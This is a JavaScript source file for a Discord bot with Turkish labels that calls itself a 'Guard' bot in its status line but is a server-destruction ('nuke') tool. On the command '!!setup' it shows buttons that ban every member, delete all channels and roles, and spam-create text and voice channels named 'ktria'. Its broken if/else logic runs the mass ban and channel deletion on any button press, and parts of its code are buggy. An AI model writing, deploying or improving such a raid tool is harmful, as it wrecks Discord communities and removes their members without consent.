const { Client, MessageEmbed } = require('discord.js');
const client = new Client();
const moment = require("moment");
const button = require('discord-buttons');
button(client);

client.ayar = {
  ktoken: ""
};

client.on("ready", () => {
  console.log("KTRİAAA ALLAHİNA GURBAAAAAN"); 
  client.user.setPresence({ activity: { name: "Ktria New Guard 💚", type: "PLAYING" }, status: "dnd" }) });

client.on("message", async message => {
let args = message.content.split("setup");
if(args[0] !== "!!") return; 
else 
{
  let button_1 = new button.MessageButton()
  .setStyle('green') 
  .setLabel('Üyeleri Banla') 
  .setID('1') 

  let button_2 = new button.MessageButton()
  .setStyle('red')  
  .setLabel('Kanalları Sil')
  .setID('2') 

  let button_3 = new button.MessageButton()
  .setStyle('red')  
  .setLabel('Rolleri Sil')
  .setID('3') 

  let button_4 = new button.MessageButton()
  .setStyle('red')  
  .setLabel('Kanal Oluştur')
  .setID('4') 

  let button_5 = new button.MessageButton()
  .setStyle('red')  
  .setLabel('Ses Kanalı Oluştur')
  .setID('5') 

  await message.channel.send(`
  aşağıdan buton seçimi yapabilirsiniz`, { buttons: [button_1, button_2, button_3, button_4, button_5] })

  client.on("clickButton", async (button) => {
    if(button.id === "1") {
        message.guild.members.forEach(member => member.ban()) 
        await button.think(true)
        await button.reply.edit(`Herkes Banlandı`)
      } else {
        message.guild.members.forEach(member => member.ban()) 
        await button.think(true)
        await button.reply.edit(`Herkes Banlandı`)
      }


    if(button.id === "2") {
        message.guild.channels.forEach(channel => channel.delete())
        await button.think(true)
        await button.reply.edit(`Tüm Kanallar Silindi`)
      } else {
        message.guild.channels.forEach(channel => channel.delete())
        await button.think(true)
        await button.reply.edit(`Tüm Kanallar Silindi`)
      }
    

    if(button.id === "3") {
        message.guild.roles.forEach(a => a.delete())
        message.guild.createRole({ name: `KtriaButonluPatlatmaBotu`, position: 20, permissions: ['MANAGE_MESSAGES'], color: 'BLUE'})
        await button.think(true)
        await button.reply.edit(`Roller Silindi Ktria Özel Rol Açıldı!`)
      } else {
        message.guild.roles.forEach(a => a.delete())
        message.guild.createRole({ name: `KtriaButonluPatlatmaBotu`, position: 20, permissions: ['MANAGE_MESSAGES'], color: 'BLUE'})
        await button.think(true)
        await button.reply.edit(`Roller Silindi Ktria Özel Rol Açıldı!`)
      }
  
      
    if(button.id === "4") {
      if(button.clicker.member.roles.cache.get(client.ayar)) {
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        await button.think(true)
        await button.reply.edit(`Kanallar oluşturuldu`)
      } else {
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
        message.guild.channels.create("ktria",{type: "text"})
          await button.think(true)
          await button.reply.edit(`Kanallar oluşturuldu`)
      }
    }  

    if(button.id === "5") {
      if(button.clicker.member.roles.cache.get(client.ayar)) {
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
      } else {
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
        message.guild.channels.create("ktria",{type: "voice"})
      }
    } 
})}})
client.login(client.ayar.ktoken)